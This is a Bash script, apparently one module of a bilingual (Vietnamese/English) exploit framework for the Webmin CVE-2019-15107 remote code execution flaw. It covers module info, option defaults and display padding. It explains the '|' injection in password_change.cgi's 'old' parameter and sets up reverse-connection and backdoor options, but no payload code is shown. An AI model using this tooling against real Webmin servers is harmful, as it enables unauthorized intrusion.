function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: CVE-2019-15107 | Lỗ hổng thực thi mã từ xa Webmin
     Mô-đun: exploit/unix/webapp/CVE-2019-15107_webmin_rce
   Nền tảng: Unix, Linux
  Kiến trúc: Cmd, x86, x64
  Quyền hạn: Có
    Loại mã: Python & Metasploit(Ruby)
    Công bố: 10/08/2019

Cung cấp bởi:
  jas502n
  vulhub
  AkkuS
  wvu <wvu@metasploit.com>
!
platform
	if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
cat << !

Mục tiêu khả dụng:

   Id  Tên
   --  ----
   0   Webmin phiên bản từ 1.882 đến 1.921 và được bật "thay đổi mật khẩu người dùng"
!
	else
cat << !

Mục tiêu khả dụng:

   Id  Tên
   --  ----
   0   Tự động (Bộ nhớ trong Unix)
   1   Tự động (Linux ống nhỏ giọt)
       ,----------------------------------------------.
       |    Mục tiêu bao gồm các phiên bản Webmin     |
       |----------------------------------------------|
       |       phiên bản từ 1.882 đến 1.921           |
       |  và được bật "thay đổi mật khẩu người dùng"  |
       '----------------------------------------------'
!
	fi
module_compare
cat << !
Hỗ trợ quét lỗ hổng:
   Có

Miêu tả:
   Lỗ hổng được bí mật chèn vào mã nguồn của máy chủ xây dựng Webmin bởi một hacker vô danh.
   Khi tính năng "cho phép thay đổi mật khẩu người dùng" được bật, tệp "password_change.cgi"
   gửi mật khẩu cũ đến hàm "encrypt_password" trong tệp "acl/acl-lib.pl" và gọi hàm "unix_crypt".
   Lổ hổng này tồn tại trong hàm mã hóa &unix_crypt. Hàm "unix_crypt" được gọi trong hàm 
   "xác thực mật mật khẩu cũ".Bằng cách sử dụng kí tự "|" để đọc file shadow trong quá trình
   xác thực mật khẩu cũ trông qua yêu cầu POST.
   Khi gửi một yêu cầu với POST data bình thường, chúng ta sẽ nhận được lỗi "Failed to change
   password: The current password is incorrect."
   Tệp "password_change.cgi" sẽ chỉ kiểm tra tham số "old" trên server mà không cần
   kiểm tra username có đúng hay không. Vì vậy, nếu thêm ký tự "|" trong POST data,
   chúng ta có thể chạy bất kỳ lệnh nào trên server thông qua hàm "password_change.cgi".

Tham khảo:
   http://www.webmin.com/exploit.html
   https://www.cvedetails.com/cve/CVE-2019-15107/
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107
   https://nvd.nist.gov/vuln/detail/CVE-2019-15107
   https://www.exploit-db.com/exploits/47293
   https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107
   https://github.com/jas502n/CVE-2019-15107

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: CVE-2019-15107 | Webmin Remote Code Execution Vulnerability
     Module: exploit/unix/webapp/CVE-2019-15107_webmin_rce
   Platform: Unix, Linux
       Arch: Cmd, x86, x64
 Privileged: Yes
  Code type: Python & Metasploit(Ruby)
  Disclosed: 10/08/2019

Provided by:
  jas502n
  vulhub
  AkkuS
  wvu <wvu@metasploit.com>
!
platform
	if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
cat << !

Available targets:

   Id  Name
   --  ----
   0   Webmin version 1.882 through 1.921 and enabled "user password change"
!
	else
cat << !

Available targets:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
   1   Automatic (Linux Dropper)
       ,----------------------------------------------.
       |    Targets includes Webmin versions          |
       |----------------------------------------------|
       |       version 1.882 through 1.921            |
       |     and enabled "user password change"       |
       '----------------------------------------------'
!
	fi
module_compare
cat << !
Vulnerability scanning support:
   Yes

Description:
   The vulnerability was secretly inserted into the source code of the Webmin build server 
   by an anonymous hacker.
   When the "allow user password change" feature is enabled, the file "password_change.cgi" 
   sends the old password to the "encrypt_password" function in the "acl/acl-lib.pl" file
   and calls the "unix_crypt" function.
   This vulnerability exists in the &unix_crypt function. The "unix_crypt" function is called
   in the "old password authentication" function. By using the "|" to read the shadow file 
   during the old password authentication process via the POST request. When sending a request
   with normal POST data, we get the error "Failed to change password: The current password
   is incorrect."
   The file "password_change.cgi" will only check the "old" parameter on the server without
   checking whether the username is correct or not. So if adding the "|" character 
   in the POST data, we can run any command on the server via 
   the "password_change.cgi" function.

References:
   http://www.webmin.com/exploit.html
   https://www.cvedetails.com/cve/CVE-2019-15107/
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107
   https://nvd.nist.gov/vuln/detail/CVE-2019-15107
   https://www.exploit-db.com/exploits/47293
   https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107
   https://github.com/jas502n/CVE-2019-15107

!
fi
}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
	platform="Python"
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'` > /dev/null 2>&1
	lport="4444"
	backdoor_file=""
	rhost=""
	rport="10000"
	ssl="False"
	method="Netcat"
	attack_type="Lan"
	srvhost="0.0.0.0"
	srvport="8080"
	publichost=`dig +short myip.opendns.com @resolver1.opendns.com`
	publicport=`echo $lport`
	proxies=""
	sslcert=""
	targeturi="/"
	uripath=""
	vhost=""
	target="0"
	rhost_lenght=18
	backdoor_file_lenght=18
	publichost_lenght=18
	proxies_lenght=18
	sslcert_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"
if [[ $rhost_lenght -le 18 ]]; then
	rhost_lenght=18
fi
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	if [[ $publichost_lenght -le 18 ]]; then
		publichost_lenght=18
	fi
	if [[ $backdoor_file_lenght -le 18 ]]; then
		backdoor_file_lenght=18
	fi
	plus_strings=`expr $backdoor_file_lenght + $rhost_lenght + $publichost_lenght`
else
	if [[ $proxies_lenght -le 18 ]]; then
		proxies_lenght=18
	fi
	if [[ $sslcert_lenght -le 18 ]]; then
		sslcert_lenght=18
	fi
	plus_strings=`expr $sslcert_lenght + $rhost_lenght + $proxies_lenght`
fi
if  [[ "$plus_strings" -le 54 ]]; then
		module1
else
		module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "platform" ]] || [[ "$new_processing_variables" = "PLATFORM" ]] || [[ "$new_processing_variables" = "Platform" ]]; then
			if [[ "$module_set" = "python" ]] || [[ "$module_set" = "PYTHON" ]] || [[ "$module_set" = "Python" ]] || [[ "$module_set" = "py" ]] || [[ "$module_set" = "Py" ]] || [[ "$module_set" = "0" ]]; then
				unset platform
				platform="$module_set"
			elif [[ "$module_set" = "msf" ]] || [[ "$module_set" = "MSF" ]] || [[ "$module_set" = "Msf" ]] || [[ "$module_set" = "metasploit" ]] || [[ "$module_set" = "Metasploit" ]] || [[ "$module_set" = "1" ]]; then
				unset platform
				platform="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "backdoor_file" ]] || [[ "$new_processing_variables" = "BACKDOOR_FILE" ]] || [[ "$new_processing_variables" = "Backdoor_file" ]]; then
			unset backdoor_file
			backdoor_file=`echo "$module_set" | cut -d "'" -f2` > /dev/null 2>&1
			################ bỏ đi ký tự cuối ####################
			backdoor_name=${backdoor_file##*/}
			backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
			type_file=`echo $file_name | cut -d'.' -f2 | sed 's/./\U&/g'` > /dev/null 2>&1
			if [[ $backdoor_file_lenght -le 18 ]]; then
				backdoor_file_lenght=18
			fi
		elif [[ "$new_processing_variables" = "srvhost" ]] || [[ "$new_processing_variables" = "SRVHOST" ]] || [[ "$new_processing_variables" = "Srvhost" ]]; then
			unset srvhost
			srvhost="$module_set"
		elif [[ "$new_processing_variables" = "srvport" ]] || [[ "$new_processing_variables" = "SRVPORT" ]] || [[ "$new_processing_variables" = "Srvport" ]]; then
			unset srvport
			srvport="$module_set"
		elif [[ "$new_processing_variables" = "rhost" ]] || [[ "$new_processing_variables" = "RHOST" ]] || [[ "$new_processing_variables" = "Rhost" ]]; then
			unset rhost
			rhost="$module_set"
			rhost_lenght=`echo $rhost | awk '{print length}'`
			if [[ $rhost_lenght -le 18 ]]; then
				rhost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "rport" ]] || [[ "$new_processing_variables" = "RPORT" ]] || [[ "$new_processing_variables" = "Rport" ]]; then
			unset rport
			rport="$module_set"
		elif [[ "$new_processing_variables" = "publichost" ]] || [[ "$new_processing_variables" = "PUBLICHOST" ]] || [[ "$new_processing_variables" = "Publichost" ]]; then
			unset publichost
			publichost="$module_set"
			publichost_lenght=`echo $publichost | awk '{print length}'`
			if [[ $publichost_lenght -le 18 ]]; then
				publichost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "publicport" ]] || [[ "$new_processing_variables" = "PUBLICPORT" ]] || [[ "$new_processing_variables" = "Publicport" ]]; then
			unset publicport
			publicport="$module_set"
		elif [[ "$new_processing_variables" = "method" ]] || [[ "$new_processing_variables" = "METHOD" ]] || [[ "$new_processing_variables" = "Method" ]]; then
			if [[ "$module_set" = "netcat" ]] || [[ "$module_set" = "NETCAT" ]] || [[ "$module_set" = "Netcat" ]]; then
				unset method
				method="$module_set"
			elif [[ "$module_set" = "file" ]] || [[ "$module_set" = "FILE" ]] || [[ "$module_set" = "File" ]]; then
				unset method
				method="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "ssl" ]] || [[ "$new_processing_variables" = "SSL" ]] || [[ "$new_processing_variables" = "Ssl" ]]; then
			if [[ "$module_set" = "false" ]] || [[ "$module_set" = "FALSE" ]] || [[ "$module_set" = "False" ]]; then
				unset ssl
				ssl="$module_set"
			elif [[ "$module_set" = "true" ]] || [[ "$module_set" = "TRUE" ]] || [[ "$module_set" = "True" ]]; then
				unset ssl
				ssl="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "attack_type" ]] || [[ "$new_processing_variables" = "ATTACK_TYPE" ]] || [[ "$new_processing_variables" = "Attack_type" ]]; then
			if [[ "$module_set" = "lan" ]] || [[ "$module_set" = "LAN" ]] || [[ "$module_set" = "Lan" ]]; then
				unset attack_type
				attack_type="$module_set"
			elif [[ "$module_set" = "wan" ]] || [[ "$module_set" = "WAN" ]] || [[ "$module_set" = "Wan" ]]; then
				unset attack_type
				attack_type="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "proxies" ]] || [[ "$new_processing_variables" = "PROXIES" ]] || [[ "$new_processing_variables" = "Proxies" ]]; then
			unset proxies
			proxies="$module_set"
			proxies_lenght=`echo $proxies | awk '{print length}'`
			if [[ $proxies_lenght -le 18 ]]; then
				proxies_lenght=18
			fi
		elif [[ "$new_processing_variables" = "sslcert" ]] || [[ "$new_processing_variables" = "SSLCERT" ]] || [[ "$new_processing_variables" = "Sslcert" ]] || [[ "$new_processing_variables" = "SSLCert" ]]; then
			unset sslcert
			sslcert="$module_set"
			sslcert_lenght=`echo $sslcert | awk '{print length}'`
			if [[ $sslcert_lenght -le 18 ]]; then
				sslcert_lenght=18
			fi
		elif [[ "$new_processing_variables" = "targeturi" ]] || [[ "$new_processing_variables" = "TARGETURI" ]] || [[ "$new_processing_variables" = "Targeturi" ]]; then
			unset targeturi
			targeturi="$module_set"
		elif [[ "$new_processing_variables" = "uripath" ]] || [[ "$new_processing_variables" = "URIPATH" ]] || [[ "$new_processing_variables" = "Uripath" ]]; then
			unset uripath
			uripath="$module_set"
		elif [[ "$new_processing_variables" = "vhost" ]] || [[ "$new_processing_variables" = "VHOST" ]] || [[ "$new_processing_variables" = "Vhost" ]]; then
			unset vhost
			vhost="$module_set"
		elif [[ "$new_processing_variables" = "target" ]] || [[ "$new_processing_variables" = "TARGET" ]] || [[ "$new_processing_variables" = "Target" ]]; then
			if [[ "$module_set" = "0" ]] || [[ "$module_set" = "1" ]]; then
				unset target
				target="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		fi
}

##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
	integer=`expr 20 - $backdoor_file_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	backdoor_file=$backdoor_file$myvar
unset_value
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
	integer=`expr 20 - $rhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rhost=$rhost$myvar
unset_value
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
	integer=`expr 20 - $rport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rport=$rport$myvar
unset_value
ssl=`echo $ssl`
ssl_lenght=`echo $ssl | awk '{print length}'`
	integer=`expr 20 - $ssl_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	ssl=$ssl$myvar
unset_value
method=`echo $method`
method_lenght=`echo $method | awk '{print length}'`
	integer=`expr 20 - $method_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	method=$method$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
	integer=`expr 20 - $attack_type_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
srvhost=`echo $srvhost`
srvhost_lenght=`echo $srvhost | awk '{print length}'`
	integer=`expr 20 - $srvhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	srvhost=$srvhost$myvar
unset_value
srvport=`echo $srvport`
srvport_lenght=`echo $srvport | awk '{print length}'`
	integer=`expr 20 - $srvport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	srvport=$srvport$myvar
unset_value
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
	integer=`expr 20 - $publichost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publichost=$publichost$myvar
unset_value
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
	integer=`expr 20 - $publicport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
proxies=`echo $proxies`
proxies_lenght=`echo $proxies | awk '{print length}'`
	integer=`expr 20 - $proxies_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	proxies=$proxies$myvar
unset_value
sslcert=`echo $sslcert`
sslcert_lenght=`echo $sslcert | awk '{print length}'`
	integer=`expr 20 - $sslcert_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	sslcert=$sslcert$myvar
unset_value
targeturi=`echo $targeturi`
targeturi_lenght=`echo $targeturi | awk '{print length}'`
	integer=`expr 20 - $targeturi_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	targeturi=$targeturi$myvar
unset_value
uripath=`echo $uripath`
uripath_lenght=`echo $uripath | awk '{print length}'`
	integer=`expr 20 - $uripath_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	uripath=$uripath$myvar
unset_value
vhost=`echo $vhost`
vhost_lenght=`echo $vhost | awk '{print length}'`
	integer=`expr 20 - $vhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	vhost=$vhost$myvar
unset_value
module_banner_1
}
function module2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	backdoor_file=`echo $backdoor_file`
	backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
	publichost=`echo $publichost`
	publichost_lenght=`echo $publichost | awk '{print length}'`
	subtract_compare1=`expr $publichost_lenght - $backdoor_file_lenght`
	subtract_compare2=`expr $rhost_lenght - $backdoor_file_lenght`
	subtract_compare3=`expr $rhost_lenght - $publichost_lenght`

	if [[ $subtract_compare1 -gt 0 ]]; then
		if [[ $subtract_compare3 -lt 0 ]]; then
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			publichost=$publichost$myvar
		unset_value
			subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			backdoor_file=$backdoor_file$myvar
		unset_value
			subtract_compare_value=`expr $publichost_lenght - $rhost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
		
			greater_value=$publichost_lenght
		else 
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $publichost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			publichost=$publichost$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $backdoor_file_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			backdoor_file=$backdoor_file$myvar
		unset_value
		
			greater_value=$rhost_lenght
		fi
	elif [[ $subtract_compare2 -gt 0 ]]; then
		if [[ $subtract_compare3 -gt 0 ]]; then
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $backdoor_file_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			backdoor_file=$backdoor_file$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $publichost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			publichost=$publichost$myvar
		unset_value
		
			greater_value=$rhost_lenght
		else 
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			publichost=$publichost$myvar
		unset_value
			subtract_compare_value=`expr $publichost_lenght - $rhost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			backdoor_file=$backdoor_file$myvar
		unset_value
		
			greater_value=$publichost_lenght
		fi
	else
		if [[ $subtract_compare2 -lt 0 ]]; then
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			backdoor_file=$backdoor_file$myvar
		unset_value
			subtract_compare_value=`expr $backdoor_file_lenght - $rhost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $backdoor_file_lenght - $publichost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			publichost=$publichost$myvar
		unset_value
		
			greater_value=$backdoor_file_lenght
		else 
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $publichost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			publichost=$publichost$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $backdoor_file_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			backdoor_file=$backdoor_file$myvar
		unset_value
		
			greater_value=$rhost_lenght
		fi
	fi
	publicport=`echo $publicport`
	publicport_lenght=`echo $publicport | awk '{print length}'`
	subtract_compare_value=`expr $greater_value - $publicport_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		publicport=$publicport$myvar
	unset_value
	method=`echo $method`
	method_lenght=`echo $method | awk '{print length}'`
	subtract_compare_value=`expr $greater_value - $method_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		method=$method$myvar
	unset_value
	attack_type=`echo $attack_type`
	attack_type_lenght=`echo $attack_type | awk '{print length}'`
	subtract_compare_value=`expr $greater_value - $attack_type_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		attack_type=$attack_type$myvar
	unset_value
else
	proxies=`echo $proxies`
	proxies_lenght=`echo $proxies | awk '{print length}'`
	sslcert=`echo $sslcert`
	sslcert_lenght=`echo $sslcert | awk '{print length}'`
	subtract_compare1=`expr $sslcert_lenght - $proxies_lenght`
	subtract_compare2=`expr $rhost_lenght - $proxies_lenght`
	subtract_compare3=`expr $rhost_lenght - $sslcert_lenght`

	if [[ $subtract_compare1 -gt 0 ]]; then
		if [[ $subtract_compare3 -lt 0 ]]; then
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			sslcert=$sslcert$myvar
		unset_value
			subtract_compare_value=`expr $sslcert_lenght - $proxies_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			proxies=$proxies$myvar
		unset_value
			subtract_compare_value=`expr $sslcert_lenght - $rhost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
		
			greater_value=$sslcert_lenght
		else 
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $sslcert_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			sslcert=$sslcert$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $proxies_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			proxies=$proxies$myvar
		unset_value
		
			greater_value=$rhost_lenght
		fi
	elif [[ $subtract_compare2 -gt 0 ]]; then
		if [[ $subtract_compare3 -gt 0 ]]; then
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $proxies_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			proxies=$proxies$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $sslcert_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			sslcert=$sslcert$myvar
		unset_value
		
			greater_value=$rhost_lenght
		else 
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			sslcert=$sslcert$myvar
		unset_value
			subtract_compare_value=`expr $sslcert_lenght - $rhost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $sslcert_lenght - $proxies_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			proxies=$proxies$myvar
		unset_value
		
			greater_value=$sslcert_lenght
		fi
	else
		if [[ $subtract_compare2 -lt 0 ]]; then
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			proxies=$proxies$myvar
		unset_value
			subtract_compare_value=`expr $proxies_lenght - $rhost_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $proxies_lenght - $sslcert_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			sslcert=$sslcert$myvar
		unset_value
		
			greater_value=$proxies_lenght
		else 
			integer=3
			for (( i = 0 ; i < $integer; i++ )) do
				myvar=$myvar$none
			done
			rhost=$rhost$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $sslcert_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			sslcert=$sslcert$myvar
		unset_value
			subtract_compare_value=`expr $rhost_lenght - $proxies_lenght + 3`		
			for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
			done
			proxies=$proxies$myvar
		unset_value
		
			greater_value=$rhost_lenght
		fi
	fi
	targeturi=`echo $targeturi`
	targeturi_lenght=`echo $targeturi | awk '{print length}'`
	subtract_compare_value=`expr $greater_value - $targeturi_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		targeturi=$targeturi$myvar
	unset_value
	uripath=`echo $uripath`
	uripath_lenght=`echo $uripath | awk '{print length}'`
	subtract_compare_value=`expr $greater_value - $uripath_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		uripath=$uripath$myvar
	unset_value
	vhost=`echo $vhost`
	vhost_lenght=`echo $vhost | awk '{print length}'`
	subtract_compare_value=`expr $greater_value - $vhost_lenght + 3`	
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
			myvar=$myvar$none
		done
		vhost=$vhost$myvar
	unset_value
fi
srvhost=`echo $srvhost`
srvhost_lenght=`echo $srvhost | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvhost_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvhost=$srvhost$myvar
unset_value
srvport=`echo $srvport`
srvport_lenght=`echo $srvport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvport=$srvport$myvar
unset_value
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $rport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	rport=$rport$myvar
unset_value
ssl=`echo $ssl`
ssl_lenght=`echo $ssl | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $ssl_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	ssl=$ssl$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value

module_banner_2
}
function module_banner_1 {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	if [ "$language" = "VN" ]; then
	yes="  Có"
	no="  Không"
	method_value=`echo $method`
	attack_value=`echo $attack_type`
cat << !

Các tùy chọn của mô-đun (exploit/unix/webapp/CVE-2019-15107_webmin_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----           --------------- 	--------  -----------
   RHOST          $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu
   RPORT          $rport $no    Cổng dịch vụ máy chủ Webmin đang chạy.
   SSL         	  $ssl $no    Cho phép kết nối bằng SSL / TLS.
